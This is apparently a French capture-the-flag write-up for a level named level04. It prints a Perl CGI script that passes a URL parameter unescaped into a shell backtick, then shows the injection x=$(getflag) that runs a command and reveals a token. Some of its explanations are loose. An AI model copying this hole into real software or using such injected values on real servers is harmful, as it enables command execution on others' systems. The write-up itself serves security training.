@@ -1,0 +1,34 @@
+Nous sommes ici en presence d'un fichier perl 
+
+cat level04.pl nous donne : 
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+
+Etudions ce fichier : cette fonction met en place en serveur web utilisant l'adresse IP de la machine sur le port 4747
+
+use CGI qw(param) nous indique que les differentes variables sont attribuees dans l'url et separees par une &
+
+La fonction x prends en argument une variable x et l'attribue a $y qui est ensuite affiche en cas de reussite et echap en cas d'erreur
+
+Essayons donc de definir x=test en lancant le script : ./level04.pl IPMachine:4747?x=test
+
+test
+
+Le programme nous renvoie la valeur de x
+
+On va donc essayer de renvoyer la valeur de getflag : ./level04.pl IPMachine:4747?x=getflag
+
+getflag -> x a la valeur 'getflag' mais pas la valeur de getflag
+
+Il faut donc attribuer a x la valeur de getflag : ./level04.pl IPMachine:4747?x=$(getflag)
+Quand on execute le programme directement dans le terminal il ne nous affiche que Check -> Essayons directement dans le navigateur 
+
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+
